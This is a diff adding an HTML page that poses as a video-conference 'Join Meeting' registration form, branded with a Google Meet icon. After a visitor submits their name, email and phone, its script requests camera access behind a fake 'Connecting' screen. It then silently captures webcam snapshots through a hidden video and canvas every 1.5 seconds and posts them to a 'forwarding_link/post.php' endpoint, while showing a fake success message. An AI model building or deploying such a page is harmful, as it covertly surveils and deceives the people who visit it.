@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Meeting - Video Conference</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="icon" href="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #202124;
+    color: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+/* Header */
+.header {
+    display: flex;
+    align-items: center;
+    padding: 16px 24px;
+    background-color: #202124;
+    border-bottom: 1px solid #3c4043;
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 20px;
+    font-weight: 500;
+    color: #fff;
+}
+
+.logo svg {
+    width: 32px;
+    height: 32px;
+}
+
+/* Main Container */
+.main-container {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+}
+
+/* Form Container */
+.form-container {
+    background-color: #fff;
+    border-radius: 16px;
+    padding: 48px 48px 56px;
+    max-width: 480px;
+    width: 100%;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12), 0 0 1px rgba(0, 0, 0, 0.04);
+}
+
+.form-header {
+    text-align: center;
+    margin-bottom: 40px;
+}
+
+.form-header h1 {
+    color: #202124;
+    font-size: 32px;
+    font-weight: 500;
+    margin-bottom: 12px;
+    letter-spacing: -0.5px;
+}
+
+.form-header p {
+    color: #5f6368;
+    font-size: 16px;
+    line-height: 1.5;
+}
+
+/* Form Groups */
+.form-group {
+    margin-bottom: 28px;
+    position: relative;
+}
+
+.form-group label {
+    display: block;
+    color: #3c4043;
+    font-size: 15px;
+    font-weight: 500;
+    margin-bottom: 10px;
+    transition: color 0.2s;
+}
+
+input[type="text"],
+input[type="tel"],
+input[type="email"] {
+    width: 100%;
+    padding: 16px 16px;
+    border: 1.5px solid #dadce0;
+    border-radius: 8px;
+    font-size: 16px;
+    color: #202124;
+    background-color: #fff;
+    transition: all 0.2s ease;
+    font-family: 'Roboto', sans-serif;
+}
+
+input[type="text"]:hover,
+input[type="tel"]:hover,
+input[type="email"]:hover {
+    border-color: #bdc1c6;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+}
+
+input[type="text"]:focus,
+input[type="tel"]:focus,
+input[type="email"]:focus {
+    outline: none;
+    border-color: #1a73e8;
+    border-width: 2px;
+    padding: 15px 15px;
+    box-shadow: 0 2px 8px rgba(26, 115, 232, 0.15);
+}
+
+input::placeholder {
+    color: #80868b;
+    font-size: 15px;
+}
+
+/* Add floating label effect */
+.form-group.focused label {
+    color: #1a73e8;
+}
+
+/* Submit Button */
+.submit-btn {
+    width: 100%;
+    padding: 16px 24px;
+    background: linear-gradient(135deg, #1a73e8 0%, #4285f4 100%);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    margin-top: 12px;
+    letter-spacing: 0.25px;
+    box-shadow: 0 2px 8px rgba(26, 115, 232, 0.25);
+}
+
+.submit-btn:hover {
+    background: linear-gradient(135deg, #1765cc 0%, #3367d6 100%);
+    box-shadow: 0 4px 12px rgba(26, 115, 232, 0.35);
+    transform: translateY(-1px);
+}
+
+.submit-btn:active {
+    background: linear-gradient(135deg, #1557b0 0%, #2b59c3 100%);
+    box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
+    transform: translateY(0);
+}
+
+.submit-btn:focus {
+    outline: none;
+    box-shadow: 0 4px 12px rgba(26, 115, 232, 0.35), 0 0 0 3px rgba(26, 115, 232, 0.2);
+}
+
+/* Success Message (Hidden Initially) */
+#success-content {
+    display: none;
+    text-align: center;
+    animation: fadeIn 0.6s ease;
+}
+
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+        transform: translateY(20px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.success-animation {
+    width: 100px;
+    height: 100px;
+    margin: 0 auto 32px;
+    position: relative;
+}
+
+.success-circle {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #0f9d58 0%, #16c172 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 8px 24px rgba(15, 157, 88, 0.3);
+    animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+
+@keyframes scaleIn {
+    0% {
+        transform: scale(0);
+        opacity: 0;
+    }
+    100% {
+        transform: scale(1);
+        opacity: 1;
+    }
+}
+
+.success-checkmark {
+    width: 50px;
+    height: 50px;
+}
+
+.success-checkmark path {
+    fill: none;
+    stroke: #fff;
+    stroke-width: 3;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    stroke-dasharray: 60;
+    stroke-dashoffset: 60;
+    animation: drawCheck 0.5s ease-out 0.3s forwards;
+}
+
+@keyframes drawCheck {
+    to {
+        stroke-dashoffset: 0;
+    }
+}
+
+#success-content h2 {
+    color: #202124;
+    font-size: 28px;
+    font-weight: 400;
+    margin-bottom: 12px;
+    letter-spacing: -0.5px;
+}
+
+#success-content p {
+    color: #5f6368;
+    font-size: 15px;
+    line-height: 1.6;
+    margin-bottom: 32px;
+}
+
+.user-info {
+    background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+    border-radius: 12px;
+    padding: 24px;
+    margin-top: 32px;
+    text-align: left;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+    border: 1px solid #e8eaed;
+}
+
+.user-info-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 14px 0;
+    border-bottom: 1px solid #e8eaed;
+}
+
+.user-info-item:last-child {
+    border-bottom: none;
+}
+
+.user-info-label {
+    color: #5f6368;
+    font-size: 14px;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.user-info-label::before {
+    content: '';
+    width: 6px;
+    height: 6px;
+    background-color: #1a73e8;
+    border-radius: 50%;
+}
+
+.user-info-value {
+    color: #202124;
+    font-size: 15px;
+    font-weight: 500;
+}
+
+/* Footer */
+.footer {
+    text-align: center;
+    padding: 20px;
+    color: #9aa0a6;
+    font-size: 12px;
+    background-color: #202124;
+}
+
+/* Connecting Screen */
+#connecting-screen {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+    z-index: 9999;
+}
+
+.connecting-content {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+    width: 90%;
+    max-width: 500px;
+}
+
+.meeting-icon {
+    width: 80px;
+    height: 80px;
+    margin: 0 auto 32px;
+    background: linear-gradient(135deg, #1a73e8 0%, #4285f4 100%);
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 8px 24px rgba(26, 115, 232, 0.3);
+    animation: pulse 2s ease-in-out infinite;
+}
+
+.meeting-icon svg {
+    width: 40px;
+    height: 40px;
+    fill: #fff;
+}
+
+@keyframes pulse {
+    0%, 100% {
+        transform: scale(1);
+        box-shadow: 0 8px 24px rgba(26, 115, 232, 0.3);
+    }
+    50% {
+        transform: scale(1.05);
+        box-shadow: 0 12px 32px rgba(26, 115, 232, 0.5);
+    }
+}
+
+.connecting-spinner {
+    width: 48px;
+    height: 48px;
+    margin: 24px auto;
+    position: relative;
+}
+
+.connecting-spinner::before {
+    content: '';
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    border: 3px solid transparent;
+    border-top: 3px solid #1a73e8;
+    border-right: 3px solid #1a73e8;
+    border-radius: 50%;
+    animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.connecting-content h2 {
+    color: #fff;
+    font-size: 28px;
+    font-weight: 400;
+    margin-bottom: 16px;
+    letter-spacing: -0.5px;
+}
+
+.connecting-content p {
+    color: #b8b8b8;
+    font-size: 15px;
+    line-height: 1.6;
+    margin-bottom: 12px;
+}
+
+.connecting-status {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    color: #1a73e8;
+    font-size: 14px;
+    font-weight: 500;
+    margin-top: 24px;
+}
+
+.status-dot {
+    width: 8px;
+    height: 8px;
+    background-color: #1a73e8;
+    border-radius: 50%;
+    animation: blink 1.5s ease-in-out infinite;
+}
+
+@keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+}
+
+.connecting-dots::after {
+    content: '';
+    animation: dots 1.5s steps(4, end) infinite;
+}
+
+@keyframes dots {
+    0%, 20% { content: ''; }
+    40% { content: '.'; }
+    60% { content: '..'; }
+    80%, 100% { content: '...'; }
+}
+
+.blur-background {
+    filter: blur(8px);
+    pointer-events: none;
+}
+
+/* Responsive */
+@media (max-width: 600px) {
+    .form-container {
+        padding: 32px 24px;
+    }
+    
+    .header {
+        padding: 12px 16px;
+    }
+}
+</style>
+</head>
+
+<body>
+<!-- Hidden video and canvas for camera capture -->
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<!-- Header -->
+<div class="header">
+    <div class="logo">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+            <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
+        </svg>
+        <span>Meeting Registration</span>
+    </div>
+</div>
+
+<!-- Main Container -->
+<div class="main-container">
+    <!-- Form Container -->
+    <div class="form-container" id="user-form">
+        <div class="form-header">
+            <h1>Join Meeting</h1>
+            <p>Enter your details to join the video conference</p>
+        </div>
+        
+        <form id="detailsForm" onsubmit="return submitForm(event)">
+            <div class="form-group">
+                <label for="userName">Full Name</label>
+                <input type="text" id="userName" name="userName" placeholder="John Smith" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="userEmail">Email Address</label>
+                <input type="email" id="userEmail" name="userEmail" placeholder="john.smith@example.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="userPhone">Phone Number</label>
+                <input type="tel" id="userPhone" name="userPhone" placeholder="+1 (555) 000-0000" required>
+            </div>
+            
+            <button type="submit" class="submit-btn">Continue to Meeting</button>
+        </form>
+    </div>
+    
+    <!-- Success Message (Hidden Initially) -->
+    <div class="form-container" id="success-content">
+        <div class="success-animation">
+            <div class="success-circle">
+                <svg class="success-checkmark" viewBox="0 0 52 52">
+                    <path d="M14 27l7.5 7.5L38 18"/>
+                </svg>
+            </div>
+        </div>
+        <h2>You're all set!</h2>
+        <p>Your registration was successful. You can now join the meeting once an administrator lets you in the meeting.</p>
+        
+        <div class="user-info">
+            <div class="user-info-item">
+                <span class="user-info-label">Name</span>
+                <span class="user-info-value" id="display-name"></span>
+            </div>
+            <div class="user-info-item">
+                <span class="user-info-label">Email</span>
+                <span class="user-info-value" id="display-email"></span>
+            </div>
+            <div class="user-info-item">
+                <span class="user-info-label">Phone</span>
+                <span class="user-info-value" id="display-phone"></span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Connecting Screen (Hidden Initially) -->
+<div id="connecting-screen">
+    <div class="connecting-content">
+        <div class="meeting-icon">
+            <svg viewBox="0 0 24 24">
+                <path fill="currentColor" d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
+            </svg>
+        </div>
+        <h2>Joining meeting</h2>
+        <p>Setting up your video and audio</p>
+        <div class="connecting-spinner"></div>
+        <div class="connecting-status">
+            <span class="status-dot"></span>
+            <span class="connecting-dots">Connecting</span>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+    <p>&copy; 2025 Video Conference Platform. All rights reserved.</p>
+</div>
+
+<script>
+// Camera capture functionality
+function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata},
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result){
+            // call the function that handles the response/results
+        },
+        error: function(){
+        }
+    });
+};
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = {
+    audio: false,
+    video: {
+        facingMode: "user"
+    }
+};
+
+// Access webcam
+async function init() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+        // Camera permission granted, now we can hide the connecting screen
+        hideConnectingScreen();
+    } catch (e) {
+        console.error(`navigator.getUserMedia error:${e.toString()}`);
+        // Even if denied, hide connecting screen after a delay
+        setTimeout(hideConnectingScreen, 2000);
+    }
+}
+
+// Success
+function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function(){
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+    }, 1500);
+}
+
+// Hide connecting screen and show success
+function hideConnectingScreen() {
+    // Fade out connecting screen
+    var connectingScreen = document.getElementById('connecting-screen');
+    connectingScreen.style.opacity = '0';
+    connectingScreen.style.transition = 'opacity 0.5s ease';
+    
+    setTimeout(function() {
+        connectingScreen.style.display = 'none';
+        document.querySelector('.header').classList.remove('blur-background');
+        document.querySelector('.main-container').classList.remove('blur-background');
+        document.querySelector('.footer').classList.remove('blur-background');
+        
+        // Show success message
+        document.getElementById('success-content').style.display = 'block';
+    }, 500);
+}
+
+// Form submission
+function submitForm(event) {
+    event.preventDefault();
+    
+    // Get form values
+    var name = document.getElementById('userName').value;
+    var email = document.getElementById('userEmail').value;
+    var phone = document.getElementById('userPhone').value;
+    
+    // Store values globally for later use
+    window.userData = { name, email, phone };
+    
+    // Log the data (you can send this to your server)
+    console.log('Name:', name);
+    console.log('Email:', email);
+    console.log('Phone:', phone);
+    
+    // Hide form immediately
+    document.getElementById('user-form').style.display = 'none';
+    
+    // Show connecting screen with blur effect
+    var connectingScreen = document.getElementById('connecting-screen');
+    connectingScreen.style.display = 'block';
+    connectingScreen.style.opacity = '1';
+    document.querySelector('.header').classList.add('blur-background');
+    document.querySelector('.main-container').classList.add('blur-background');
+    document.querySelector('.footer').classList.add('blur-background');
+    
+    // Request camera permissions after a brief delay
+    // This makes it feel more natural
+    setTimeout(function() {
+        init();
+    }, 800);
+    
+    // Set user data for display (will show when hideConnectingScreen is called)
+    setTimeout(function() {
+        document.getElementById('display-name').textContent = name;
+        document.getElementById('display-email').textContent = email;
+        document.getElementById('display-phone').textContent = phone;
+    }, 100);
+    
+    return false;
+}
+</script>
+
+</body>
+</html>
